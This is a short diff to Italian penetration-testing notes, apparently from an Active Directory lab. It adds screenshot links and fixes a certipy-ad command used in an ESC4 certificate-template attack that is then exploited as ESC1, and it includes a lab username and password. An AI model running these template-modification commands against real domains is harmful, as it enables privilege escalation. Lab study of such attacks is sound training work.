@@ -249,11 +249,13 @@ Grazie al permesso genericWrite possiamo modificare il nostro template per rende
 ```bash
 certipy-ad template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug
 ```
+![[Pasted image 20230828151521.png]]
 Poi exploitalo come ESC1.
 Per riportarlo alla normalità
 ```bash
-certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
+certipy-ad template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
 ```
+![[Pasted image 20230828151547.png]]
 ### **ESC 6 - ADCS**
 ### **ESC 8 - ADCS**
 
